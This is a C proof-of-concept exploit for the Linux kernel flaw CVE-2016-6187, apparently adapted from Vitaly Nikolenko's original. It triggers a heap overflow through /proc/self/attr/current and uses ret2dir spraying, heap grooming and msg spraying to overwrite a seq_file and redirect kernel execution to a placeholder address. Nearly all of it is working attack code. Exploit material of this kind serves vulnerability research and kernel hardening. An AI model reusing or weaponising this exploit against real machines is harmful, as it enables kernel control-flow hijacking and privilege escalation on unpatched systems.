/**
 * poc for CVE-2016-6187, originally written by Vitaly Nikolenko
 * modified by kylebot
 *
 * modified by kylebot
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <assert.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include "libexp.h"

#define CRASH_IP 0xffffffffdeadbeef

struct seq_file {
	char hole1[0x40];
	char mutex[0x20];
	void* op;
	char hole2[0x18];
};

struct seq_operations {
	void* start;
	void* stop;
	void* next;
	int* show;
};

char payload[0x80];
struct seq_file *fake_seq_file;
struct seq_operations fake_ops;
int fd;

void setup_context()
{
	fd = open("/proc/self/attr/current", O_RDWR);
	if (fd == -1)
		error_out("trigger fd");
}

u64 _get_mem_size(void)
{
	FILE *f = fopen("/proc/meminfo", "r");
	char *line_buf = NULL;
	char *buf;
	size_t n;

	assert(f != NULL);

	if(getline(&line_buf, &n, f) < 0) {
		free(line_buf);
		goto out;
	}
	buf = strstr(line_buf, ":") + 1;
	fclose(f);
	return atoll(buf) * 1024;

out:
	puts("fail to read memory size");
	fclose(f);
	return -1;
}

void setup_payload()
{
	// use ret2dir to spray the fake fops
	fake_ops.start = (void *)CRASH_IP;
	u64 upper_limit = _get_mem_size() & (~0xfff);
	u64 kaddr = 0xffff880000000000 + upper_limit/4*3;
	kaddr &= 0xfffffffffffff000;
	printf("kaddr: %#llx\n", kaddr);
	for(int i=0;i<upper_limit/0x1000/4;i++) {
		void *addr = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_ANON|MAP_PRIVATE|MAP_POPULATE, -1, 0);
		memcpy(addr, &fake_ops, sizeof(fake_ops));
	}

	// craft fake seq_file
	memset(payload, 'A', sizeof(payload));
	fake_seq_file = (struct seq_file *)(payload - 0x28);
	fake_seq_file->op = (void *)kaddr;
	// fake_seq_file->op = 0x4141414141414141;
	memset(fake_seq_file->mutex, 0, 0x20);
}

void exploit()
{
	char buf[0x80];

	set_cpu(0);

	setup_context();

	// fill the buffer so the vulnerability can be triggered
	memset(buf, 'A', sizeof(buf));

	// maximize time slice
	ts_fence();

	// defragmentation
	defragment(0x80, 320);

	// trigger vulnerability
	write(fd, buf, 0x80);

	// fill a hole
	defragment(0x80, 1);

	// open proc file to allocate seq_file
	int seq_fd = open("/proc/buddyinfo", O_RDONLY);
	if (unlikely(seq_fd == -1))
		error_out("seq_fd");

	// overwrite seq_file
	struct msg_spray_t *spray = msg_spray(payload, 0x40, 0x100);

	// trigger crash
	read(seq_fd, buf, 4);

	// clean up
	msg_spray_clean(spray);
}

int main()
{
	set_cpu(0);
	setup_payload();
	while(1) {
		usleep(10);
		if(!clean_fork()) {
			exploit();
			exit(0);
		}
		wait(NULL);
	}
}
